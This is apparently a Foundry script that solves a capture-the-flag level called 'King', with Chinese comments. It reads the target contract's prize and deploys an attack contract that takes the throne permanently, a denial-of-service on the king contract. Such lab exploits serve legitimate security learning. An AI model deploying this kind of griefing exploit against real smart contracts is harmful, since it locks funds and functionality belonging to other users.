// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/KingAttack.sol";

// 假設 King 合約的介面，用來讀取當前的 prize
interface IKing {
    function prize() external view returns (uint256);
}

contract SolveKing is Script {
    function run() external {
        // 從環境變數讀取 Private Key
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        
        // 你的 King 實例地址 (請替換成你的)
        address payable target = payable(0x27d1541c9421601573b1d000bcBCD0d62d29cA7d);

        vm.startBroadcast(deployerPrivateKey);

        // 1. 取得當前的 prize 金額
        IKing kingContract = IKing(target);
        uint256 currentPrize = kingContract.prize();
        console.log("Current Prize:", currentPrize);

        // 2. 部署攻擊合約，並發送比 currentPrize 稍微多一點點的錢 (例如 + 1 wei)
        // 只要 >= currentPrize 就能奪冠
        new KingAttack{value: currentPrize}(target);

        console.log("Attack deployed. You are now the King forever!");

        vm.stopBroadcast();
    }
}
